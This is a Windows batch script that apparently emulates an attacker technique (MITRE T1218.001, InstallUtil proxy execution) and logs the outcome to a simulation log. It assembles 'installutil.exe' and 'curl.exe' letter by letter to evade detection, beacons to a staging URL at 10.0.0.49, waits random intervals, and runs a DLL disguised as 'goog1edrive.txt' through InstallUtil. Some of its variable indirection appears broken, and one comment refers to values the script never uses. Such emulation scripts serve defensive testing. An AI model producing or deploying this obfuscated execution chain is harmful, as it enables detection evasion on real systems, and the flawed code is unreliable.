@echo off
SETLOCAL EnableDelayedExpansion

REM Random constant names with PHR_ as values
SET zxqtsn=%APPDATA%\7694\1e9f7238
SET dvhhnj=https://10.0.0.49
SET qmdkbp=https://10.0.0.49/stage/2/icon.png?7694-10
SET lkwsgt=ITZEL-S2BO
SET wqskbc=10
SET bmnftk=goog1edrive.txt
SET zxnwdq=7694
SET vtprcb=1

REM Log file using PHR_ variable
SET logvjf=!APPDATA!\!wqskbc!\macula-simulations.log
SET agentnc=!lkwsgt!

REM Obfuscated installutil.exe with variable indirection
SET dhsxq=i
SET rtfgh=n
SET yhgfd=s
SET wsxec=t
SET qazpl=a
SET ikmju=l
SET olpnb=l
SET bvcrf=u
SET mnjik=t
SET wsxq=i
SET plkmo=l
SET nbhgt=.
SET cfvgy=e
SET xswqa=x
SET tgbhy=e

SET lev1a=!dhsxq!!rtfgh!!yhgfd!!wsxec!
SET lev1b=!qazpl!!ikmju!!olpnb!
SET lev1c=!bvcrf!!mnjik!!wsxq!!plkmo!!nbhgt!!cfvgy!!xswqa!!tgbhy!
SET lolref1=lev1a
SET lolref2=lev1b
SET lolref3=lev1c
SET rtyup=!lolref1!
SET fghjk=!lolref2!
SET edcws=!lolref3!
SET tgbnm=!rtyup!!fghjk!!edcws!

REM Obfuscated curl command parts
SET cur1=c
SET cur2=u
SET cur3=r
SET cur4=l
SET cur5=.
SET cur6=e
SET cur7=x
SET cur8=e
SET curlpart1=!cur1!!cur2!!cur3!!cur4!
SET curlpart2=!cur5!!cur6!!cur7!!cur8!
SET curlref1=curlpart1
SET curlref2=curlpart2
SET curlvar=!curlref1!!curlref2!

REM Command arguments with indirection
SET arg1=/
SET arg2=l
SET arg3=o
SET arg4=g
SET arg5=f
SET arg6=i
SET arg7=l
SET arg8=e
SET arg9==
SET argpart1=!arg1!!arg2!!arg3!!arg4!!arg5!!arg6!!arg7!!arg8!!arg9!
SET argpart2=/
SET argpart3=L
SET argpart4=o
SET argpart5=g
SET argpart6=T
SET argpart7=o
SET argpart8=C
SET argpart9=o
SET argpart10=n
SET argpart11=s
SET argpart12=o
SET argpart13=l
SET argpart14=e
SET argpart15==
SET argpart16=f
SET argpart17=a
SET argpart18=l
SET argpart19=s
SET argpart20=e
SET argref1=argpart1
SET argref2=argpart2
SET argref3=argpart3!argpart4!!argpart5!!argpart6!!argpart7!!argpart8!!argpart9!!argpart10!!argpart11!!argpart12!!argpart13!!argpart14!!argpart15!!argpart16!!argpart17!!argpart18!!argpart19!!argpart20!
SET argref4=/
SET argref5=U
SET argref6=argref4
SET argref7=argref5
SET fullarg1=!!argref1!
SET fullarg2=!!argref2!!argref3!
SET fullarg3=!!argref6!!argref7!

REM Debug logging check
if "!vtprcb!"=="1" (
    echo [!DATE! !TIME!][DEBUG][!agentnc!]: SCRIPT_START=initializing>> "!logvjf!" 2>nul
)

REM Initial random delay
SET /A del1=%RANDOM% %% 31 + 30
timeout /t !del1! /nobreak >nul
if "!vtprcb!"=="1" (
    echo [!DATE! !TIME!][DEBUG][!agentnc!]: DELAY=!del1! seconds>> "!logvjf!" 2>nul
)

REM Step 0: Heartbeat check
if "!vtprcb!"=="1" (
    echo [!DATE! !TIME!][DEBUG][!agentnc!]: HEARTBEAT_START=!qmdkbp!>> "!logvjf!" 2>nul
)
SET hearbt=!qmdkbp!
CALL :EXEC_CURL
SET hbresult=!ERRORLEVEL!
if "!vtprcb!"=="1" (
    echo [!DATE! !TIME!][DEBUG][!agentnc!]: HEARTBEAT_RESULT=errorlevel=!hbresult!>> "!logvjf!" 2>nul
)

ping -n 8 127.0.0.1 >nul

REM Step 1: Change directory
if "!vtprcb!"=="1" (
    echo [!DATE! !TIME!][DEBUG][!agentnc!]: CHDIR_START=!zxqtsn!>> "!logvjf!" 2>nul
)
SET targetdir=!zxqtsn!
cd /d "!targetdir!" 2>nul
SET cdresult=!ERRORLEVEL!
if "!vtprcb!"=="1" (
    echo [!DATE! !TIME!][DEBUG][!agentnc!]: CHDIR_RESULT=errorlevel=!cdresult!>> "!logvjf!" 2>nul
)

CHOICE /C Y /N /D Y /T 12 >nul

REM Step 2: Execute DLL with installutil
if "!vtprcb!"=="1" (
    echo [!DATE! !TIME!][DEBUG][!agentnc!]: PROCESS_START=!tgbnm! !fullarg1! !fullarg2! !fullarg3! !bmnftk!>> "!logvjf!" 2>nul
)
SET dllfile=!bmnftk!
CALL :EXEC_INSTALLUTIL
SET execresult=!ERRORLEVEL!
if "!vtprcb!"=="1" (
    echo [!DATE! !TIME!][DEBUG][!agentnc!]: PROCESS_RESULT=errorlevel=!execresult!>> "!logvjf!" 2>nul
)

REM TTP logging for T1218
SET ttpid=T1218.001
SET ttpname=InstallUtil
SET resultval=0
SET errdetail=
if !execresult! EQU 0 (
    SET resultval=1
) else (
    SET errdetail=execution_failed
)

CALL :NORMALIZE_TIMESTAMP
SET ttplog=[!normdate! !normtime!][!agentnc!]: !wqskbc!-!zxnwdq!-!ttpid!|!ttpname!=!resultval!:!errdetail!
(echo !ttplog!>> "!logvjf!" 2>nul) || (rem)

SET /A del2=%RANDOM% %% 11 + 5
timeout /t !del2! /nobreak >nul
if "!vtprcb!"=="1" (
    echo [!DATE! !TIME!][DEBUG][!agentnc!]: DELAY=!del2! seconds>> "!logvjf!" 2>nul
    echo [!DATE! !TIME!][DEBUG][!agentnc!]: SCRIPT_END=exit_code=!execresult!>> "!logvjf!" 2>nul
)

ENDLOCAL
EXIT /B !execresult!

:EXEC_CURL
REM Obfuscated curl execution
SET curl_cmd=!curlvar!
SET curl_opt1=-
SET curl_opt2=k
SET curl_opt3= -
SET curl_opt4=s
SET curl_opt5= -
SET curl_opt6=o
SET curl_opt7= nul
SET curl_opt8= "
SET curl_opt9=!hearbt!
SET curl_opt10="
SET curl_full=!curl_cmd! !curl_opt1!!curl_opt2!!curl_opt3!!curl_opt4!!curl_opt5!!curl_opt6!!curl_opt7! !curl_opt8!!curl_opt9!!curl_opt10!
!curl_full!
EXIT /B !ERRORLEVEL!

:EXEC_INSTALLUTIL
REM Obfuscated installutil execution
SET install_cmd=!tgbnm!
SET arg_space= 
SET install_args=!fullarg1!!arg_space!!fullarg2!!arg_space!!fullarg3!!arg_space!!dllfile!
!install_cmd! !install_args!
EXIT /B !ERRORLEVEL!

:NORMALIZE_TIMESTAMP
SET year=!DATE:~10,4!
SET month=!DATE:~4,2!
SET day=!DATE:~7,2!
SET normdate=!year!-!month!-!day!
SET normtime=!TIME!
IF "!normtime:~0,1!"==" " SET normtime=0!normtime:~1!
SET normtime=!normtime:~0,12!
EXIT /B 0